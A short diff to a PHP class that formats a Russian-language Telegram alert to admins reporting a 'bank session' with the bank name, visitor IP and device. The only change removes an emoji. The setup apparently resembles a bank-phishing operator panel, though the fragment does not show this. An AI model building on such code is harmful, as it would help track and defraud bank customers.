@@ -115,7 +115,7 @@ class NotifyAdminsOfBankSession
 🏦 Банк: <b>{$bank}</b>
 🌍 IP: <code>{$ip}</code>{$domainLine}
 {$device}
-🟢 Онлайн
+Онлайн
 HTML;
 
         $channelId = config('services.telegram.notify_channel');
